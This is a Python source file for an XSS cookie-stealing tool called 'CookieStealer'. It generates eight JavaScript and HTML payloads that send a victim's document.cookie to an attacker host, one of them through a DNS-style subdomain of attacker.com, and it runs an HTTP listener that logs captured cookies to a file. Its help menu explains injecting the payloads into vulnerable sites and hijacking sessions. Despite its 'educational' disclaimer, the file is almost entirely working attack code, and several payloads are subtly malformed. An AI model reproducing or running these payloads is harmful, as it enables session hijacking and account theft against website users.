import os
import pyfiglet
import termcolor
import http.server
import socketserver
from colorama import Fore, init
from termcolor import colored

init(autoreset=True)

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def show_banner():
    banner = pyfiglet.figlet_format("CookieStealer")
    Banner = colored(banner, "red")
    print(Banner)
    print(Fore.YELLOW + "         |..:: Made by Aryan Giri ::..|")
    print(Fore.YELLOW + "  ⚠ This tool is only made for educational & research purposes ⚠\n")

def start_listener(port):
    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if "cookie=" in self.path:
                cookie = self.path.split("cookie=")[-1]
                with open("stolen_cookies.txt", "a") as f:
                    f.write(cookie + "\n")
                print(Fore.GREEN + "[+] Cookie Received: " + cookie)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Cookie captured!")
    
    with socketserver.TCPServer(("0.0.0.0", port), Handler) as httpd:
        print(Fore.CYAN + f"\n[+] Listening on port {port}...\n")
        httpd.serve_forever()

def generate_payload(option, lhost):
    payloads = {
        1: f"""<script>
fetch("{lhost}/steal.php?cookie=" + document.cookie);
</script>""",

        2: f"""<img src="{lhost}/steal.php?cookie=" + document.cookie>""",

        3: f"""<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "{lhost}/steal.php?cookie=" + document.cookie, true);
xhr.send();
</script>""",

        4: f"""<iframe src="{lhost}/steal.php?cookie=" + document.cookie"></iframe>""",

        5: f"""<script>
var ws = new WebSocket("ws://{lhost}:8080");
ws.onopen = function() {{
    ws.send(document.cookie);
}};
</script>""",

        6: f"""<form action="{lhost}/steal.php" method="POST">
<input type="hidden" name="cookie" value="<script>document.cookie</script>">
</form>
<script>document.forms[0].submit();</script>""",

        7: f"""<script>
var encodedCookie = btoa(document.cookie);
fetch("{lhost}/steal.php?cookie=" + encodedCookie);
</script>""",

        8: f"""<script>
new Image().src = "http://{lhost}/" + btoa(document.cookie) + ".attacker.com";
</script>"""
    }

    return payloads.get(option, None)

while True:
    clear()
    show_banner()
    
    print(Fore.GREEN + " 1. Build Payload")
    print(Fore.GREEN + " 2. Run Listener")
    print(Fore.GREEN + " 3. Obfuscator (Coming Soon)")
    print(Fore.GREEN + " 4. Help")
    print(Fore.GREEN + " 5. Github")
    print(Fore.GREEN + " 6. Exit\n")
    
    inputx = int(input(Fore.CYAN + "@CookieStealer: "))

    if inputx == 1:
        while True:
            clear()
            show_banner()
            
            print(Fore.GREEN + " 1. Basic Payload (Fetch API)")
            print(Fore.GREEN + " 2. Using Image Request (Evasion)")
            print(Fore.GREEN + " 3. Using JavaScript (XMLHttpRequest)")
            print(Fore.GREEN + " 4. Using JavaScript (Iframe)")
            print(Fore.GREEN + " 5. Using JavaScript (WebSocket)")
            print(Fore.GREEN + " 6. Using JavaScript (Form Submission)")
            print(Fore.GREEN + " 7. Base64 Encoded Cookies (Bypassing Security)")
            print(Fore.GREEN + " 8. Advanced Payload (DNS Exfiltration)")
            print(Fore.GREEN + " 9. Back\n")

            input2 = int(input(Fore.CYAN + "@CookieStealer: "))

            if input2 == 9:
                break

            lhost = input(Fore.YELLOW + "@Enter your server address: ")

            payload = generate_payload(input2, lhost)
            if payload:
                print(Fore.GREEN + "\nGenerated XSS Payload:\n")
                print(payload)
                print(Fore.YELLOW + "\nPress Enter to go back")
                input()
            else:
                print(Fore.RED + "Invalid option! Try again.")

    elif inputx == 2:
        port = int(input(Fore.YELLOW + "@Enter listener port (Default 8080): ") or 8080)
        print(Fore.GREEN + f"Starting listener on port {port}...\n")
        start_listener(port)

    elif inputx == 4:
        print(Fore.CYAN + "\n[HELP] - How to Use CookieStealer:")
        print(Fore.YELLOW + "1. Select 'Build Payload' and choose an attack method.")
        print(Fore.YELLOW + "2. Enter your server address (e.g., http://attacker.com).")
        print(Fore.YELLOW + "3. Inject the generated XSS payload into a vulnerable site.")
        print(Fore.YELLOW + "4. Start the listener to capture stolen cookies.")
        print(Fore.YELLOW + "5. Use cookies for session hijacking (Ethical testing only).")
        print(Fore.YELLOW + "\nPress Enter to return.")
        input()

    elif inputx == 5:
        print(Fore.CYAN + "\n[Github]")
        print(Fore.YELLOW + "GitHub: https://github.com/giriaryan694-a11y/CookieStealer")
        print(Fore.YELLOW + "\nPress Enter to return.")
        input()

    elif inputx == 6:
        print(Fore.CYAN + "\nExiting the tool...")
        break

    else:
        print(Fore.RED + "Invalid option! Try again.") 
